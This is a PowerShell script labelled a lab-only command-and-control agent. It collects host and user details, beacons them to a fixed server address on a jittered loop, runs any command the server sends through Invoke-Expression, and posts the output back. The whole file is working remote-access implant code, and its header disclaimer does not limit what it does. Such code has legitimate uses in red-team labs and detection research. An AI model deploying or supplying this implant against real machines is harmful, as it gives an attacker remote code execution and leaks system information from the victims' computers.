# payload.ps1
# Lab-only PowerShell C2 Agent — Fixed version
# Only run on a VM you own with explicit consent.

param(
    [string]$Server = "http://192.168.1.100:8888",
    [int]$Sleep = 8,
    [int]$Jitter = 3
)

$ErrorActionPreference = "SilentlyContinue"
$ProgressPreference = "SilentlyContinue"

# ---- Persistent Agent ID ----
$IdFile = "$env:TEMP\.lab_agent_id"
if (Test-Path $IdFile) {
    $AgentId = (Get-Content $IdFile -Raw).Trim()
} else {
    $AgentId = [guid]::NewGuid().ToString().Substring(0, 8)
    $AgentId | Out-File -FilePath $IdFile -Encoding ASCII -NoNewline
}

# ---- Identity ----
$Hostname = $env:COMPUTERNAME
$User     = "$env:USERDOMAIN\$env:USERNAME"
try { $OS = (Get-CimInstance Win32_OperatingSystem).Caption } catch { $OS = "Windows" }
try {
    $IP = (Get-NetIPAddress -AddressFamily IPv4 |
           Where-Object { $_.IPAddress -notlike '127.*' -and $_.IPAddress -notlike '169.*' } |
           Select-Object -First 1).IPAddress
} catch { $IP = "unknown" }
$IsAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

Write-Host "[*] Agent ID: $AgentId"
Write-Host "[*] Host: $Hostname ($IP)"
Write-Host "[*] User: $User (admin=$IsAdmin)"
Write-Host "[*] Server: $Server"
Write-Host ""

function Invoke-C2 {
    param([string]$Endpoint, [hashtable]$Data)
    try {
        $Body = $Data | ConvertTo-Json -Depth 5 -Compress
        $Raw = Invoke-WebRequest -Uri "$Server$Endpoint" -Method POST `
            -Body $Body -ContentType "application/json" -TimeoutSec 15 -UseBasicParsing
        return $Raw.Content
    } catch { return $null }
}

function Send-Beacon {
    $Raw = Invoke-C2 -Endpoint "/beacon" -Data @{
        agent_id = $AgentId
        hostname = $Hostname
        user     = $User
        os       = $OS
        ip       = $IP
        is_admin = $IsAdmin
        pid      = $PID
    }
    if (-not $Raw) { return $null }
    try { return $Raw | ConvertFrom-Json } catch { return $null }
}

function Send-Results {
    param([string]$Technique, [string]$Output)
    Invoke-C2 -Endpoint "/results" -Data @{
        agent_id  = $AgentId
        technique = $Technique
        output    = $Output
        status    = "success"
    } | Out-Null
}

function Invoke-Ability {
    param([string]$Command)
    try {
        $out = Invoke-Expression $Command 2>&1 | Out-String
        if ([string]::IsNullOrWhiteSpace($out)) { return "(no output)" }
        return $out.Trim()
    } catch { return "(error: $($_.Exception.Message))" }
}

$Backoff = 1
while ($true) {
    $Beacon = Send-Beacon

    if ($null -eq $Beacon) {
        Write-Host "[-] Beacon failed. Retry in ${Backoff}s"
        Start-Sleep -Seconds $Backoff
        if ($Backoff -lt 60) { $Backoff = $Backoff * 2 }
        continue
    }

    $Backoff = 1
    $props = $Beacon.PSObject.Properties.Name

    if ($props -contains "action" -and $Beacon.action -eq "terminate") {
        Write-Host "[!] Terminate command received. Exiting."
        if (Test-Path $IdFile) { Remove-Item $IdFile -Force -ErrorAction SilentlyContinue }
        exit
    }

    if (($props -contains "cmd") -and $Beacon.cmd) {
        $tech = [string]$Beacon.technique
        $name = [string]$Beacon.name
        $cmd  = [string]$Beacon.cmd

        Write-Host "[+] $tech - $name"
        Write-Host "    cmd: $cmd"

        $Output = Invoke-Ability -Command $cmd
        Send-Results -Technique $tech -Output $Output
        Write-Host "[OK] Sent results for $tech"
        Write-Host ""
    }

    $s = $Sleep + (Get-Random -Minimum (-$Jitter) -Maximum $Jitter)
    if ($s -lt 3) { $s = 3 }
    Start-Sleep -Seconds $s
}
